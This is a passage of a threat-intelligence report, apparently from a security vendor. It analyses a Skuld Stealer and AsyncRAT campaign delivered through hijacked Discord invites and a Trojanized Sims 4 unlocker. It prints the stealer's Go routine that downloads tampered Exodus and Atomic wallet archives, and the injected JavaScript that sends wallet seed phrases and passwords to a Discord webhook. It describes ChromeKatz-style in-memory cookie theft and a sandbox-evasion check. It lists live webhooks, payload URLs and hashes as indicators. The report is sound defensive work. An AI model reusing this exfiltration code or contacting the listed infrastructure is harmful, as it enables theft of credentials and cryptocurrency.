+&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;URL&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;webhook&lt;/td&gt;&lt;td&gt;https://discord[.]com/api/webhooks/1355186248578502736/_RDywh_K6GQKXiM5T05ueXSSjYopg9nY6XFJo1o5Jnz6v9sih59A8p-6HkndI_nOTicO&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;webhook2&lt;/td&gt;&lt;td&gt;https://discord[.]com/api/webhooks/1348629600560742462/RJgSAE7cYY-1eKMkl5EI-qZMuHaujnRBMVU_8zcIaMKyQi4mCVjc9R0zhDQ7wmPoD7Xp&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;The first webhook (&lt;code&gt;webhookencr&lt;/code&gt;) is used for exfiltrating general data, such as browser credentials, system information, and Discord tokens.&lt;/li&gt;
+
+
+
+&lt;li&gt;The second webhook (&lt;code&gt;webhookencr2&lt;/code&gt;) is specifically reserved for exfiltrating highly sensitive data: crypto wallet seed phrases and passwords from the&amp;nbsp;&lt;strong&gt;Exodus&lt;/strong&gt;&amp;nbsp;and&amp;nbsp;&lt;strong&gt;Atomic&lt;/strong&gt;&amp;nbsp;crypto wallets.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;Below is a partially restored Go-code responsible for this logic:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;func main() {
+	CONFIG["webhook"] = decryptXOR(CONFIG["webhookencr"].(string))
+	CONFIG["webhook2"] = decryptXOR(CONFIG["webhookencr2"].(string))
+
+	actions := []func(string){
+		wallets.Run,
+		browsers.Run,
+		system.Run,
+		discodes.Run,
+		commonfiles.Run,
+		tokens.Run,
+	}
+
+	// Standard modules using the first webhook
+	for _, action := range actions {
+		go action(CONFIG["webhook"].(string))
+	}
+
+	// Special module for crypto wallet injection using the second webhook
+	go mainGowrap1(CONFIG["webhook2"].(string))
+}
+
+func mainGowrap1(webhook2 string) {
+	atomicURL := "https://github.com/hackirby/wallets-injection/raw/main/atomic.asar"
+	exodusURL := "https://github.com/hackirby/wallets-injection/raw/main/exodus.asar"
+	walletsinjection.Run(atomicURL, exodusURL, webhook2)
+}
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;Skuld uses a malicious technique known as wallet injection.&amp;nbsp;It replaces legitimate cryptocurrency wallet application files&amp;nbsp;(&lt;strong&gt;app.asar&lt;/strong&gt;)&amp;nbsp;with modified versions downloaded from GitHub.&amp;nbsp;Skuld Stealer specifically targets the Exodus and Atomic crypto wallets.&amp;nbsp;The &lt;strong&gt;.asar&lt;/strong&gt;&amp;nbsp;files are archive files used by Electron applications&amp;nbsp;(cross-platform applications built with JavaScript,&amp;nbsp;HTML,&amp;nbsp;and CSS).&amp;nbsp;Electron applications commonly use&amp;nbsp;&lt;strong&gt;.asar&lt;/strong&gt;&amp;nbsp;archives to package their source code and assets.&lt;/p&gt;
+
+
+
+&lt;p&gt;Skuld Stealer downloads malicious&amp;nbsp;&lt;code&gt;.asar&lt;/code&gt;&amp;nbsp;files from the following repositories:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;&lt;strong&gt;Atomic Wallet&lt;/strong&gt;: &lt;code&gt;https://github.com/hackirby/wallets-injection/raw/main/atomic.asar&lt;/code&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;Exodus Wallet&lt;/strong&gt;: &lt;code&gt;https://github.com/hackirby/wallets-injection/raw/main/exodus.asar&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;Once downloaded,&amp;nbsp;Skuld replaces the original wallet archives with these malicious versions.&amp;nbsp;Additionally,&amp;nbsp;Skuld creates seemingly harmless LICENSE text files in the wallet directories,&amp;nbsp;and embeds Discord webhook URLs:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;&lt;strong&gt;Atomic wallet:&lt;/strong&gt; &lt;code&gt;%LOCALAPPDATA%\\Programs\\atomic\\LICENSE.electron.txt&lt;/code&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;Exodus wallet:&lt;/strong&gt; &lt;code&gt;%LOCALAPPDATA%\\exodus\\app-&amp;lt;version&amp;gt;\\LICENSE&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31494" height="366" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-18-Fake-LICENSE-file-in-Exodus-wallet-contains-a-Discord-webhook-URL.png" width="577" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 18&lt;/strong&gt; &amp;#8211; Fake LICENSE file in Exodus wallet contains a Discord webhook URL.&lt;/p&gt;
+
+
+
+&lt;p&gt;These webhook URLs are then read by the malicious JavaScript inside the injected&amp;nbsp;&lt;code&gt;.asar&lt;/code&gt;&amp;nbsp;files.&lt;/p&gt;
+
+
+
+&lt;p&gt;When users interact with their wallets,&amp;nbsp;the patched JavaScript function extracts sensitive user data, such as password and seed phrases,&amp;nbsp;and sends it to the attacker.&lt;/p&gt;
+
+
+
+&lt;p&gt;For instance,&amp;nbsp;in the case of the&amp;nbsp;&lt;strong&gt;Exodus wallet&lt;/strong&gt;,&amp;nbsp;Skuld injects malicious code into the wallet&amp;#8217;s&amp;nbsp;&lt;code&gt;unlock&lt;/code&gt;&amp;nbsp;function,&amp;nbsp;which receives the user&amp;#8217;s entered password and retrieves the seed phrase.&amp;nbsp;The malicious JavaScript then sends both the extracted seed phrase and password to the attacker via the Discord webhook.&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;      async unlock(e) {
+         if (await this.shouldUseTwoFactorAuthMode()) return;
+         const t = await Object(ee.readSeco)(this._walletPaths.seedFile, e);
+         this._setSeed(M.fromBuffer(t)), P.a.randomFillSync(t), await this._loadLightningCreds()
+
+         const webhook = await fs.readFile('LICENSE', 'utf8');
+         const mnemonic = this._seed.mnemonicString;
+         const password = e;
+         const computerName = os.hostname();
+         const username = os.userInfo().username;
+
+         var request = new XMLHttpRequest();
+         request.open("POST", webhook, true);
+         request.setRequestHeader("Content-Type", "application/json");
+
+         var payload = JSON.stringify({
+            "username": "skuld - exodus injection",
+            "avatar_url": "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png",
+            "content": "`" + computerName + "`" + " - " + "`" + username + "`",
+            "embeds": [
+            {
+               "title": "Exodus Injection",
+               "color": 0xb143e3,
+               "footer": {
+                  "text": "skuld exodus injection - made by hackirby",
+                  "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
+               },
+               "fields": [
+                  {
+                     "name": "Mnemonic",
+                     "value": "`" + mnemonic + "`",
+                  },
+                  {
+                     "name": "Password",
+                     "value": "`" + password + "`",
+                  },
+               ],
+            },
+         ]});
+
+         request.send(payload);
+
+      }
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;As we know,&amp;nbsp;the seed phrase&amp;nbsp;(or mnemonic phrase)&amp;nbsp;is a human‑readable representation of a wallet’s master private key.&amp;nbsp;Under standards like&amp;nbsp;&lt;a href="https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki"&gt;BIP‑39&lt;/a&gt;,&amp;nbsp;a 12‑&amp;nbsp;or 24‑word mnemonic encodes the entropy that,&amp;nbsp;when run through a key‑derivation function&amp;nbsp;(e.g.&amp;nbsp;&lt;a href="https://datatracker.ietf.org/doc/html/rfc2898"&gt;PBKDF2&lt;/a&gt;)&amp;nbsp;and the&amp;nbsp;&lt;a href="https://github.com/bitcoin/bips/blob/master/bip-0032.mediawiki"&gt;BIP‑32&lt;/a&gt;&amp;nbsp;hierarchical‑deterministic algorithm,&amp;nbsp;generates the wallet’s master private key and all its descendant private/public key pairs.&lt;/p&gt;
+
+
+
+&lt;p&gt;In practical terms,&amp;nbsp;obtaining a user’s seed phrase lets an attacker reconstruct every private key in that wallet’s keychain and therefore grants full control over all cryptocurrency addresses and funds derived from it.&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;Campaign Evolution and Addition of New Modules&lt;/h2&gt;
+
+
+
+&lt;p&gt;During our ongoing monitoring of the campaign,&amp;nbsp;we observed that the threat actors periodically update the&amp;nbsp;&lt;code&gt;installer.exe&lt;/code&gt;&amp;nbsp;downloader.&amp;nbsp;Newer versions often achieve zero detection rates on VirusTotal.&amp;nbsp;Additionally,&amp;nbsp;new payloads are occasionally introduced.&lt;/p&gt;
+
+
+
+&lt;p&gt;In 2024,&amp;nbsp;Google introduced a security feature in Chrome called Application-Bound Encryption&amp;nbsp;(ABE),&amp;nbsp;aimed at preventing cookie extraction via standard access to SQLite&amp;nbsp;Cookies&amp;nbsp;files.&amp;nbsp;This enhancement rendered most traditional stealers,&amp;nbsp;including Skuld,&amp;nbsp;ineffective.&lt;/p&gt;
+
+
+
+&lt;p&gt;To circumvent this,&amp;nbsp;attackers adapted the open-source tool ChromeKatz&amp;nbsp;(&lt;a href="https://github.com/Meckazin/ChromeKatz/"&gt;https://github.com/Meckazin/ChromeKatz/&lt;/a&gt;),&amp;nbsp;enabling them to steal cookies from updated versions of Google Chrome,&amp;nbsp;as well as Chromium-based browsers like Edge and Brave.&amp;nbsp;The updated&amp;nbsp;&lt;code&gt;installer.exe&lt;/code&gt;&amp;nbsp;(SHA256:&amp;nbsp;&lt;strong&gt;160eda7ad14610d93f28b7dee20501028c1a9d4f5dc0437794ccfc2604807693&lt;/strong&gt;)&amp;nbsp;also downloads the stealer from BitBucket,&amp;nbsp;where it is stored in encrypted form:&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;https://bitbucket[.]org/syscontrol6/syscontrol/downloads/cks.exe&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;To decrypt the downloaded binary,&amp;nbsp;the loader uses the same encryption algorithm used for the other payloads.&amp;nbsp;The decrypted&amp;nbsp;&lt;strong&gt;cks.exe&lt;/strong&gt;&amp;nbsp;has the SHA256 hash:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;&lt;strong&gt;f08676eeb489087bc0e47bd08a3f7c4b57ef5941698bc09d30857c650763859c&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;Unlike traditional stealers that rely on decrypting cookie files,&amp;nbsp;the ChromeKatz-based stealer operates directly within the browser&amp;#8217;s memory,&amp;nbsp;effectively bypassing ABE and extracting cookies from the latest versions of Google Chrome,&amp;nbsp;Edge,&amp;nbsp;and Brave.&amp;nbsp;The stealer accesses the browser process memory directly,&amp;nbsp;retrieving cookies in their decrypted form.&lt;/p&gt;
+
+
+
+&lt;p&gt;Before initiating cookie collection,&amp;nbsp;the stealer searches for the appropriate browser process&amp;nbsp;(&lt;code&gt;chrome.exe&lt;/code&gt;,&amp;nbsp;&lt;code&gt;msedge.exe&lt;/code&gt;,&amp;nbsp;or&amp;nbsp;&lt;code&gt;brave.exe&lt;/code&gt;)&amp;nbsp;for injection.&amp;nbsp;It enumerates active processes,&amp;nbsp;identifies browser processes,&amp;nbsp;determines the executable path using the&amp;nbsp;&lt;code&gt;K32GetModuleFileNameExW&lt;/code&gt;&amp;nbsp;function,&amp;nbsp;and retrieves the browser version via&amp;nbsp;&lt;code&gt;GetFileVersionInfoW&lt;/code&gt;.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31495" height="135" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-19-Detecting-the-browser-version.png" width="519" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 19&lt;/strong&gt; &amp;#8211; Detecting the browser version.&lt;/p&gt;
+
+
+
+&lt;p&gt;This step is crucial,&amp;nbsp;as ChromeKatz can only operate with specific browser versions where the&amp;nbsp;&lt;code&gt;CookieMap&lt;/code&gt;&amp;nbsp;structure in memory is known.&lt;/p&gt;
+
+
+
+&lt;p&gt;Notably,&amp;nbsp;cookies are stored exclusively in a single child process of the browser,&amp;nbsp;the&amp;nbsp;&lt;code&gt;NetworkService&lt;/code&gt;,&amp;nbsp;responsible for network operations.&amp;nbsp;To locate the correct process,&amp;nbsp;the stealer checks for the following string in the command-line arguments:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;--utility-sub-type=network.mojom.NetworkService
+&lt;/pre&gt;
+
+
+
+&lt;p&gt;The steps in the cookie extraction mechanism:&lt;/p&gt;
+
+
+
+&lt;ol class="wp-block-list"&gt;
+&lt;li&gt;The stealer identifies the largest &lt;code&gt;MEM_PRIVATE | PAGE_READWRITE&lt;/code&gt; memory region within the browser&amp;#8217;s memory, presumed to contain the &lt;code&gt;CookieMap&lt;/code&gt; structure.&lt;/li&gt;
+
+
+
+&lt;li&gt;It employs signature-based search with masks (patterns containing &lt;code&gt;0xAA&lt;/code&gt; as wildcards) to locate the start of the structure.&lt;/li&gt;
+
+
+
+&lt;li&gt;The stealer recursively traverses the B-tree representing the in-memory cookie storage structure to extract cookie data.&lt;/li&gt;
+&lt;/ol&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31496" height="455" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-20-Recursive-traversal-of-the-B-tree-storing-cookies-in-browser-memory.png" width="743" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 20&lt;/strong&gt; &amp;#8211; Recursive traversal of the B-tree storing cookies in browser memory.&lt;/p&gt;
+
+
+
+&lt;p&gt;The attackers incorporated string encryption&amp;nbsp;(similar to that used in the downloaders)&amp;nbsp;and a check for the presence of a &amp;nbsp;&lt;strong&gt;settings.txt&lt;/strong&gt;&amp;nbsp;file,&amp;nbsp;which should have been created by the downloader.&amp;nbsp;This simple trick allows the stealer to bypass sandbox environments,&amp;nbsp;as the module exits without initiating malicious activity if run in isolation from the rest of the malware chain.&lt;/p&gt;
+
+
+
+&lt;p&gt;The stolen data is archived into a file &lt;strong&gt;exported_cookies.zip&lt;/strong&gt;,&amp;nbsp;which is then sent to the attackers via a Discord webhook.&lt;/p&gt;
+
+
+
+&lt;p&gt;In the analyzed samples&amp;nbsp;(SHA256:&amp;nbsp;&lt;strong&gt;db1aa52842247fc3e726b339f7f4911491836b0931c322d1d2ab218ac5a4fb08&lt;/strong&gt;,&amp;nbsp;&lt;br /&gt;&lt;strong&gt;f08676eeb489087bc0e47bd08a3f7c4b57ef5941698bc09d30857c650763859c&lt;/strong&gt;),&amp;nbsp;the following webhook URLs were used:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;&lt;strong&gt;https://discord[.]com/api/webhooks/1363890376271724785/NiZ1XTpzvw27K9O-0IVn7jM7oVVA_6drg91Wxgtgm78A9xsLoD1e_t-GFLiRBw5Lfv41&lt;/strong&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;https://discord[.]com/api/webhooks/1367077804990009434/jPrMZM5-Rq9LryHdcKRBvsObHHWhNvHnnhPn07yohGYsDdFYadR2YCk4oqnHwXekdDib&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;Additional Campaign Targeting Gamers&lt;/h2&gt;
+
+
+
+&lt;p&gt;We also identified another active campaign, operated by the same threat actors,&amp;nbsp;which shares core characteristics with the previously described campaign&amp;nbsp;but employs a different initial infection vector.&amp;nbsp;In this case,&amp;nbsp;the loader is distributed as a Trojanized hacktool for unlocking pirated downloadable content&amp;nbsp;(DLC)&amp;nbsp;in&amp;nbsp;&lt;em&gt;The Sims 4&lt;/em&gt;&amp;nbsp;—&amp;nbsp;specifically targeting that game&amp;#8217;s player base.&lt;/p&gt;
+
+
+
+&lt;p&gt;The malicious archive&amp;nbsp;&lt;strong&gt;Sims4-Unlocker.zip&lt;/strong&gt;&amp;nbsp;(SHA256:&amp;nbsp;&lt;strong&gt;ef8c2f3c36fff5fccad806af47ded1fd53ad3e7ae22673e28e541460ff0db49c&lt;/strong&gt;)&amp;nbsp;is hosted at:&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;https://bitbucket[.]org/htfhtthft/simshelper/downloads/Sims4-Unlocker.zip&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;p&gt;Bitbucket provides download counters,&amp;nbsp;allowing us to see the scope of the campaign.&amp;nbsp;During our monitoring,&amp;nbsp;we observed more than&amp;nbsp;&lt;strong&gt;350 downloads&lt;/strong&gt;&amp;nbsp;of the archive:&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31497" height="286" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-21-Bitbucket-download-count-for-Sims4-Unlocker_zip-1024x286.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 21&lt;/strong&gt; &amp;#8211; Bitbucket download count for Sims4-Unlocker.zip&lt;/p&gt;
+
+
+
+&lt;p&gt;Despite the different entry point and target audience,&amp;nbsp;the same loader framework is used,&amp;nbsp;along with the&amp;nbsp;&lt;strong&gt;Skuld Stealer&lt;/strong&gt;&amp;nbsp;and&amp;nbsp;&lt;strong&gt;AsyncRAT&lt;/strong&gt;&amp;nbsp;payloads.&lt;/p&gt;
+
+
+
+&lt;p&gt;Additional related repositories likely linked to past campaigns by the same actors:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;&lt;strong&gt;https://bitbucket[.]org/updateservicesvar/serv/downloads/&lt;/strong&gt;&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;https://bitbucket[.]org/registryclean1/fefsed/downloads/&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;h1 class="wp-block-heading"&gt;Victims and Impact&lt;/h1&gt;
+
+
+
+&lt;p&gt;Precise identification of victims remains challenging due to the nature of the attack infrastructure.&amp;nbsp;As the Skuld Stealer uses Discord webhooks,&amp;nbsp;a one-way communication method,&amp;nbsp;for exfiltrating stolen data,&amp;nbsp;the attackers receive sensitive information without leaving publicly accessible traces.&amp;nbsp;As a result,&amp;nbsp;direct victim attribution is limited.&lt;/p&gt;
+
+
+
+&lt;p&gt;However,&amp;nbsp;hosting payloads on Bitbucket provides a way to roughly estimate the campaign’s reach based on the download statistics.&amp;nbsp;Across several observed repositories,&amp;nbsp;the number of downloads exceeded 1,300.&amp;nbsp;While not every download necessarily corresponds to a successful infection,&amp;nbsp;this number lets us reasonably approximate the potential victim pool.&lt;/p&gt;
+
+
+
+&lt;p&gt;Based on external telemetry,&amp;nbsp;we determined that victims are distributed across multiple countries,&amp;nbsp;including:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;United States&lt;/li&gt;
+
+
+
+&lt;li&gt;Vietnam&lt;/li&gt;
+
+
+
+&lt;li&gt;France&lt;/li&gt;
+
+
+
+&lt;li&gt;Germany&lt;/li&gt;
+
+
+
+&lt;li&gt;Slovakia&lt;/li&gt;
+
+
+
+&lt;li&gt;Austria&lt;/li&gt;
+
+
+
+&lt;li&gt;Netherlands&lt;/li&gt;
+
+
+
+&lt;li&gt;United Kingdom&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;The choice of payloads,&amp;nbsp;including a powerful stealer specifically targeting cryptocurrency wallets,&amp;nbsp;suggests that the attackers are primarily focused on crypto users and motivated by financial gain.&lt;/p&gt;
+
+
+
+&lt;h1 class="wp-block-heading"&gt;Conclusion&lt;/h1&gt;
+
+
+
+&lt;p&gt;This campaign illustrates how a subtle feature of Discord&amp;#8217;s invite system,&amp;nbsp;the ability to reuse expired or deleted invite codes in vanity invite links,&amp;nbsp;can be exploited as a powerful attack vector.&amp;nbsp;By hijacking legitimate invite links,&amp;nbsp;threat actors silently redirect unsuspecting users to malicious Discord servers.&lt;/p&gt;
+
+
+
+&lt;p&gt;The attackers constructed a carefully orchestrated,&amp;nbsp;multi-stage infection chain,&amp;nbsp;beginning with social engineering techniques,&amp;nbsp;followed by a PowerShell-based downloader,&amp;nbsp;and employing trusted services like GitHub,&amp;nbsp;Bitbucket,&amp;nbsp;and Pastebin to stealthily host and deliver encrypted malware payloads.&amp;nbsp;Interestingly,&amp;nbsp;instead of employing sophisticated obfuscation or packing techniques,&amp;nbsp;they relied on simpler yet highly effective evasion methods:&amp;nbsp;Altering behavior based on command-line parameters,&amp;nbsp;introducing execution delays through scheduled tasks,&amp;nbsp;and decrypting payloads only after multi-step execution.&lt;/p&gt;
+
+
+
+&lt;p&gt;The selected payloads,&amp;nbsp;specifically AsyncRAT and a customized variant of Skuld Stealer,&amp;nbsp;indicate a financial motivation behind this attack.&amp;nbsp;While Skuld targets credentials from multiple sources&amp;nbsp;such as browsers and Discord,&amp;nbsp;the campaign places particular emphasis on cryptocurrency wallets,&amp;nbsp;notably Exodus and Atomic,&amp;nbsp;by injecting malicious JavaScript that exfiltrates stolen wallet seed phrases and passwords via a dedicated Discord webhook.&amp;nbsp;At the same time,&amp;nbsp;the persistent scheduled task regularly triggers the second-stage loader,&amp;nbsp;ensuring continuous execution and persistence of AsyncRAT.&amp;nbsp;Even if a victim discovers and removes the malware,&amp;nbsp;AsyncRAT will be redownloaded and re-executed,&amp;nbsp;enabling attackers to retain ongoing remote control over previously compromised systems.&lt;/p&gt;
+
+
+
+&lt;p&gt;Discord took swift action to disable the malicious bot used in this campaign, which helps disrupt the current infection chain.&amp;nbsp;However,&amp;nbsp;the broader risk, that&amp;nbsp;attackers could create new bots or adopt alternate delivery methods that leverage the same core techniques, still remains.&lt;/p&gt;
+
+
+
+&lt;h1 class="wp-block-heading"&gt;Protection&lt;/h1&gt;
+
+
+
+&lt;p&gt;Check Point &lt;a href="https://www.checkpoint.com/infinity/zero-day-protection/"&gt;Threat Emulation&lt;/a&gt; and &lt;a href="https://www.checkpoint.com/harmony/endpoint/"&gt;Harmony Endpoint&lt;/a&gt; provide comprehensive coverage of attack tactics, file types, and operating systems and protect against the attacks and threats described in this report.&lt;/p&gt;
+
+
+
+&lt;h1 class="wp-block-heading"&gt;Indicators of Compromise&lt;/h1&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;Hashes&lt;/h2&gt;
+
+
+
+&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;SHA256&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;673090abada8ca47419a5dbc37c5443fe990973613981ce622f30e83683dc932&lt;/td&gt;&lt;td&gt;1st Stage Downloader (RnrLoader)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;160eda7ad14610d93f28b7dee20501028c1a9d4f5dc0437794ccfc2604807693&lt;/td&gt;&lt;td&gt;1st Stage Downloader (RnrLoader newer version)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;5d0509f68a9b7c415a726be75a078180e3f02e59866f193b0a99eee8e39c874f&lt;/td&gt;&lt;td&gt;2nd Stage Downloader (RnrLoader)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;375fa2e3e936d05131ee71c5a72d1b703e58ec00ae103bbea552c031d3bfbdbe&lt;/td&gt;&lt;td&gt;PowerShell Script&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;53b65b7c38e3d3fca465c547a8c1acc53c8723877c6884f8c3495ff8ccc94fbe&lt;/td&gt;&lt;td&gt;AsyncRAT payload&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;d54fa589708546eca500fbeea44363443b86f2617c15c8f7603ff4fb05d494c1&lt;/td&gt;&lt;td&gt;AsyncRAT payload&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;670be5b8c7fcd6e2920a4929fcaa380b1b0750bfa27336991a483c0c0221236a&lt;/td&gt;&lt;td&gt;AsyncRAT payload&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;8135f126764592be3df17200f49140bfb546ec1b2c34a153aa509465406cb46c&lt;/td&gt;&lt;td&gt;Skuld Stealer payload&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;f08676eeb489087bc0e47bd08a3f7c4b57ef5941698bc09d30857c650763859c&lt;/td&gt;&lt;td&gt;ChromeKatz payload&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;db1aa52842247fc3e726b339f7f4911491836b0931c322d1d2ab218ac5a4fb08&lt;/td&gt;&lt;td&gt;ChromeKatz payload&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;ef8c2f3c36fff5fccad806af47ded1fd53ad3e7ae22673e28e541460ff0db49c&lt;/td&gt;&lt;td&gt;Sims4-Unlocker.zip&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;h2 class="wp-block-heading"&gt;Network Indicators&lt;/h2&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;Phishing Website:&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;captchaguard[.]me&lt;/li&gt;
+
+
+
+&lt;li&gt;https://captchaguard[.]me/?key=&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;PowerShell Script:&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;https://pastebin[.]com/raw/zW0L2z2M&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;Bitbucket repositories:&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;https://bitbucket[.]org/updatevak/upd/downloads&lt;/li&gt;
+
+
+
+&lt;li&gt;https://bitbucket[.]org/syscontrol6/syscontrol/downloads&lt;/li&gt;
+
+
+
+&lt;li&gt;https://bitbucket[.]org/updateservicesvar/serv/downloads&lt;/li&gt;
+
+
+
+&lt;li&gt;https://bitbucket[.]org/registryclean1/fefsed/downloads&lt;/li&gt;
+
+
+
+&lt;li&gt;https://bitbucket[.]org/htfhtthft/simshelper/downloads&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;First stage downloader:&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;https://github[.]com/frfs1/update/raw/refs/heads/main/installer.exe&lt;/li&gt;
+
+
+
+&lt;li&gt;https://github[.]com/shisuh/update/raw/refs/heads/main/installer.exe&lt;/li&gt;
+
+
+
+&lt;li&gt;https://github[.]com/gkwdw/wffaw/raw/refs/heads/main/installer.exe&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;Second stage downloader:&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;https://bitbucket[.]org/updatevak/upd/downloads/Rnr.exe&lt;/li&gt;
+
+
+
+&lt;li&gt;https://bitbucket[.]org/syscontrol6/syscontrol/downloads/Rnr.exe&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;Skuld stealer:&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;https://bitbucket[.]org/updatevak/upd/downloads/skul.exe&lt;/li&gt;
+
+
+
+&lt;li&gt;https://bitbucket[.]org/syscontrol6/syscontrol/downloads/skul.exe&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;AsyncRAT:&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;https://bitbucket[.]org/updatevak/upd/downloads/AClient.exe&lt;/li&gt;
+
+
+
+&lt;li&gt;https://bitbucket[.]org/syscontrol6/syscontrol/downloads/AClient.exe&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;AsyncRat Dead Drop Resolver:&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;https://pastebin[.]com/raw/ftknPNF7&lt;/li&gt;
+
+
+
+&lt;li&gt;https://pastebin[.]com/raw/NYpQCL7y&lt;/li&gt;
+
+
+
+&lt;li&gt;https://pastebin[.]com/raw/QdseGsQL&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
